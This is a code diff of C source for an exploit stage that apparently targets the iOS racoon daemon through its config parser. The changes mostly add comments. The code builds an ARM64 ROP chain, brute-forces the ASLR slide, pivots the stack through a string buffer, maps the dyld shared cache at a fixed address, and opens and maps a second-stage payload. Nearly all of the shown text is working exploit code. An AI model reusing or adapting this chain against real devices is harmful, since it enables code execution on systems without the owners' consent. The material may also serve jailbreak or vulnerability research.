@@ -8,9 +8,15 @@
 #include "racoon_www.h"
 #include "stage1.h"
 
+// get a good address for our rop chain
+// we will use the max slide + the address of teh memmove pointer and put the stack behind it so that we don't smash it by acciedent when brute forcing
+// because memmove is at the start of the data section we will start brute forcing with the max slide and then move downwards so placing the rop chain behind it is the right way to do it
+// otherwise we might smash it by accident when brute forcing
+// we need to pivot to this address using a string buffer (the address will be put as raw bytes into a string inside of the conf parser)
+// the conf parser doesn't care about null bytes etc but it cares about quotes so we need an address that has no quote in it otherwise the conf parser will reject our config
 uint64_t get_ropchain_addr(offset_struct_t * offsets) {
 	uint64_t test = offsets->max_slide + offsets->memmove + 16;
-	test += (test % 0x10); // align at 16 bytes (stack alignment)
+	test += (test % 0x10); // align at 16 bytes (stack alignment) (otherwise sp will cause a fault because we are misalign leading to weird crashes)
 	union converter {
 		uint64_t addr;
 		char buf[8];
@@ -29,13 +35,14 @@ uint64_t get_ropchain_addr(offset_struct_t * offsets) {
 
 void stage1(int fd, offset_struct_t * offsets) {
 
+	// generate the rop chain (see func below this one)
 	generate_stage1_rop_chain(offsets);
 
 	// get an address which is in the region that is always writeable and doesn't cotain a quote if we convert it into a string
 	uint64_t ropchain_addr = get_ropchain_addr(offsets);
 	LOG("Chain will be at: %llx",ropchain_addr);
 
-	// write all the values which shouldn't be slid
+	// write all the values which shouldn't be slid (we write them once at the beginning)
 	rop_gadget_t * curr_gadget = offsets->stage1_ropchain;
 	uint64_t curr_ropchain_addr = ropchain_addr;
 
@@ -53,11 +60,14 @@ void stage1(int fd, offset_struct_t * offsets) {
 		curr_ropchain_addr += 8;
 		curr_gadget = curr_gadget->next;
 	}
-	int iterations = (offsets->max_slide/offsets->slide_value);
+
+	// now we will write all of them that need to be slide (code addresses) then perform a trigger and if we haven't got the write slide try again
+	int iterations = (offsets->max_slide/offsets->slide_value); // calculate the number of iterations we need to perform this
 	LOG("%d iterations",iterations);
-	for (int i = iterations; i >= 0; i--) {
-		uint64_t slide = i*offsets->slide_value;
-		
+	for (int i = iterations; i >= 0; i--) { // we start with the biggerst slide and then get smaller slides because the memmove ptr is at the front of the cache so we need to start from behind so that the address we write to is always mapped
+		uint64_t slide = i*offsets->slide_value; // calc current slide
+
+		// write gadgets
 		rop_gadget_t * curr_gadget = offsets->stage1_ropchain;
 		uint64_t curr_ropchain_addr = ropchain_addr;
 		while (curr_gadget != NULL) {
@@ -197,7 +207,7 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	union path_union path;
 	snprintf((char*)&path.path,62,"/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64");
 	
-
+	// call to longjump to pivot the stack and a longjump buf
 	ROP_SETUP(offsets->stage1_ropchain);
 	ADD_OFFSET_GADGET(offsets->pivot_x21_x9_offset);	   // 0x00		[1] x9 will be loaded from here and then again point to our stack so at our stack+0x50 we need the next gadget
 	ADD_GADGET();										   // 0x08		[2] x20 [3] x5/sixth arg
@@ -206,7 +216,7 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	ADD_GADGET();										   // 0x20		[2] x23 [3] x3/fourth arg
 	ADD_GADGET();										   // 0x28		[2] x24 [3] x2/third arg
 	ADD_STATIC_GADGET(O_RDONLY);						   // 0x30		[2] x25 [3] x1/second arg
-	ADD_OFFSET_GADGET(0x2b0);							   // 0x38		[2] x26 [3] x0/first arg
+	ADD_OFFSET_GADGET(0x2b0);							   // 0x38		[2] x26 [3] x0/first arg !!!! THIS IS POINTING TO THE PATH BELOW SO WATCH OUT WHEN YOU CHANGE ANYTHING INBETWEEN YOU NEED TO AJUST THE OFFSET !!!
 	ADD_CODE_GADGET(offsets->open);						   // 0x40		[2] x27 [3] call gadget
 	ADD_GADGET();										   // 0x48		[2] x28 
 	ADD_CODE_GADGET(offsets->longjmp);					   // 0x50		[1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
@@ -222,7 +232,7 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	ADD_GADGET();										   // 0xa0		[2] weird Dx registers
 	ADD_GADGET();										   // 0xa8		[2] weird Dx registers
 
-
+	// now longjump pivoted here and after the call of open from the original longjump buf we can call mmap here to map the caceh at a static address
 	ADD_GADGET();										   // 0xb0		[2] new stack top 
 	ADD_GADGET();										   // 0xb8
 	ADD_GADGET();										   // 0xc0		[3] d9
@@ -241,7 +251,7 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	ADD_CODE_GADGET(offsets->BEAST_GADGET);				   // 0x128		[3] x30 (next gadget)
 
 #define ADD_UNSLID_CODE_GADGET(code_addr) ADD_STATIC_GADGET(code_addr-0x180000000+offsets->new_cache_addr)
-
+	// we can now use the stack cache for the other calls and now we will open stage 2 to get a file descriptor
 	ADD_GADGET();										   // 0x130		[3] new stack top
 	ADD_STATIC_GADGET(0x657461766972702f);	   			   // 0x138				(/private)
 	ADD_STATIC_GADGET(0x6361722f6374652f);	   			   // 0x140		[4] d9  (/etc/rac) 
@@ -258,7 +268,8 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	ADD_GADGET();										   // 0x198		[4] x19 [5] x7/eighth arg
 	ADD_GADGET();										   // 0x1a0		[4] x29
 	ADD_UNSLID_CODE_GADGET(offsets->BEAST_GADGET);		   // 0x1a8		[4] x30 (next gadget)
-
+	
+	// and then mmap stage 2
 	ADD_GADGET();										   // 0x1b0		[4] new stack top 
 	ADD_GADGET();										   // 0x1b8
 	ADD_GADGET();										   // 0x1c0		[5] d9
@@ -276,7 +287,7 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	ADD_GADGET();										   // 0x220		[5] x29
 	ADD_UNSLID_CODE_GADGET(offsets->BEAST_GADGET);		   // 0x228		[5] x30 (next gadget)
 
-	
+	// after that we just call longjump with x0 pointing to it (return from mmap) so that we can place a longjump buffer at the top of stage 2
 	ADD_GADGET();										   // 0x230		[5] new stack top 
 	ADD_GADGET();										   // 0x238
 	ADD_GADGET();										   // 0x240		[6] d9
@@ -294,6 +305,7 @@ void generate_stage1_rop_chain(offset_struct_t * offsets) {
 	ADD_GADGET();										   // 0x2a0		[6] x29
 	ADD_UNSLID_CODE_GADGET(offsets->longjmp);			   // 0x2a8		[6] x30 (next gadget)
 
+	// this is the cache string here
 	ADD_STATIC_GADGET(path.ints.a);						   // 0x2b0
 	ADD_STATIC_GADGET(path.ints.b);						   // 0x2b8
 	ADD_STATIC_GADGET(path.ints.c);						   // 0x2c0
